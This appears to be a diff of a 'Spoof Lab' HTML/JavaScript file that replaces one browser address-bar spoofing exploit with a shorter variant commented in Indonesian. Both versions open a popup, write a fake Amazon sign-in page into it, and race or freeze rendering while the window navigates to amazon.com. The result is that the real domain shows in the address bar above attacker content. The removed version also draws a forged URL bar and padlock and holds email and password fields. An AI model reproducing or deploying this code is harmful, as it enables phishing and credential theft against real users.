@@ -1,150 +1,36 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Spoof Lab</title>
-  <style>
-    body { margin:0; height:100vh; background:#000; color:#0f0; font-family:monospace; }
-    #trigger { font-size:3rem; padding:2rem; background:#222; cursor:pointer; user-select:none; }
-  </style>
-</head>
 <body>
-  <div id="trigger" onclick="startSpoof()">CLICK TO SPOOF</div>
+<a onclick="start()">Spoof</a>
 
-  <script>
-    let win = null;
-    let killed = false;
+<script>
+let w;
 
-    function killRenderLoop() {
-      if (killed) return;
-      killed = true;
-      
-      // ────────────────────────────────────────────────
-      // Most aggressive kill sequence for WebKit/Safari
-      // ────────────────────────────────────────────────
-      
-      // 1. Nuke the document completely
-      try { win.document.open(); win.document.write(''); win.document.close(); } catch(e){}
-      
-      // 2. Replace with a minimal blank that still allows our style
-      try {
-        win.document.body.innerHTML = '';
-        win.document.head.innerHTML = '';
-      } catch(e){}
-      
-      // 3. Prevent any further writes / navigation events
-      try {
-        win.stop();                         // stop() is still surprisingly effective
-        win.document.designMode = 'on';     // confuse parser
-        win.document.execCommand('stop');   // legacy but sometimes works
-      } catch(e){}
-      
-      // 4. Flood onerror + infinite throw to break JS execution context
-      try {
-        win.onerror = function() { while(true) throw new Error("killed"); };
-        win.eval("while(true) throw new Error('render killed');");
-      } catch(e){}
-      
-      // 5. Detach & nullify the strongest reference possible
-      try { win = null; } catch(e){}
-    }
+function start() {
+  // 1. Buka about:blank (FULL CONTROL)
+  w = window.open("about:blank", "x");
 
-    function isStillOurWindow() {
-      if (killed || !win || win.closed) return false;
-      
-      try {
-        // If we can still reach our own marker without security error → still controllable
-        return win.document.body?.innerHTML?.includes?.("SPOOFED_CONTENT_MARKER_1337");
-      } catch (e) {
-        // SecurityError / cross-origin navigation started → amazon is loading
-        return false;
-      }
-    }
+  // 2. Tulis konten attacker
+  w.document.open();
+  w.document.write(`
+    <h1>Amazon Login</h1>
+    <p>Sign in to continue</p>
+  `);
+  w.document.close();
 
-    function raceConditionKiller() {
-      if (!win || win.closed) return;
-      
-      // ────────────────────────────────
-      // Decision point: has navigation started?
-      // ────────────────────────────────
-      if (!isStillOurWindow()) {
-        // Address bar is now showing amazon.com (or is in transition)
-        // Immediately freeze & kill rendering
-        killRenderLoop();
-        return;
-      }
-      
-      // Still full control → we can keep overwriting
-      try {
-        const doc = win.document;
-        doc.open();
-        doc.write(`
-          <!DOCTYPE html>
-          <html>
-          <head>
-            <meta charset="utf-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-            <title>Amazon.com</title>
-            <style>
-              body{margin:0;padding:0;height:100vh;background:#131921;color:white;font-family:Arial,sans-serif;overflow:hidden}
-              .fake-bar{position:fixed;top:0;left:0;right:0;height:28px;background:#232f3e;color:#fff;font-size:13px;line-height:28px;padding:0 12px;z-index:999999;display:flex;align-items:center;justify-content:space-between;}
-              .url{flex:1;text-align:center;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
-              .lock{color:#00d100;font-weight:bold;}
-            </style>
-          </head>
-          <body>
-            <!-- SPOOFED_CONTENT_MARKER_1337 -->
-            <div class="fake-bar">
-              <span>🛡️</span>
-              <span class="url"><span class="lock">🔒</span> https://www.amazon.com/</span>
-              <span>⋯</span>
-            </div>
-            <div style="padding:60px 20px;color:#000;background:#fff;height:100%;box-sizing:border-box;">
-              <h1 style="color:#131921;">Welcome to Amazon</h1>
-              <p style="font-size:1.4rem;">Sign in to continue</p>
-              <!-- Put your perfect amazon phishing form here -->
-              <input type="text" placeholder="Email or phone" style="width:100%;padding:12px;margin:12px 0;border:1px solid #ccc;border-radius:4px;">
-              <input type="password" placeholder="Password" style="width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
-              <button style="width:100%;padding:14px;background:#ffa41c;color:#111;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">Sign in</button>
-            </div>
-          </body>
-          </html>
-        `);
-        doc.close();
-      } catch (e) {
-        // Navigation already started, kill it
-        killRenderLoop();
-      }
-    }
+  // 3. Paksa address bar ke target
+  setTimeout(() => {
+    w.location.replace("https://www.amazon.com:8080/");
+  }, 50);
 
-    function startSpoof() {
-      if (win && !win.closed) {
-        try{win.close();}catch(e){}
-      }
-      
-      // Use data: url first → almost instant control, no initial navigation
-      win = window.open("data:text/html,<h1>Loading Amazon…</h1>", "x", 
-        "width=1280,height=800,menubar=no,toolbar=no,location=yes,resizable=yes,scrollbars=yes"
-      );
-      
-      if (!win) {
-        alert("Popup blocked. Allow popups for this site.");
-        return;
-      }
+  // 4. Freeze visual sebelum commit
+  freeze();
+}
 
-      // Give WebKit ~80–120 ms to create the window before we hammer it
-      setTimeout(() => {
-        // Start extremely fast hammering
-        const iv = setInterval(raceConditionKiller, 0); // ~4–8 ms in Safari
-        
-        // Safety net: kill interval after ~8 seconds anyway
-        setTimeout(() => clearInterval(iv), 8000);
-        
-        // Additional death timer if user stays too long
-        setTimeout(killRenderLoop, 4500);
-      }, 100);
-    }
-  </script>
+function freeze() {
+  try {
+    // Busy loop = block rendering update
+    const t = Date.now();
+    while (Date.now() - t < 3000) {}
+  } catch(e){}
+}
+</script>
 </body>
-</html>
